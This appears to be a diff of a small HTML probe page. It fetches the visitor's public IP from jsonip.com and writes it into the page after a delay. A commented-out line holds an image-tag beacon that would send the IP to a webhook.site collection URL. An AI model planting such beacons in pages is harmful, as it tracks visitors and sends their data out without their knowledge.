@@ -4,19 +4,19 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script>
   <script type="text/javascript">
     $.getJSON("https://jsonip.com?callback=?", function(data) {
- var x = data.ip;
+ fuck(data.ip);
       });
   </script>
 </head>
-<body onload=fuck()>
+<body>
 <script>
-function fuck(){
+function fuck(x){
 setTimeout(function () {
         document.open();
   //document.write("<img src='https://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a?a='+ x>");
 document.write(x);
   document.close();
-    }, 7000);
+    }, 5000);
 }
 </script>
 
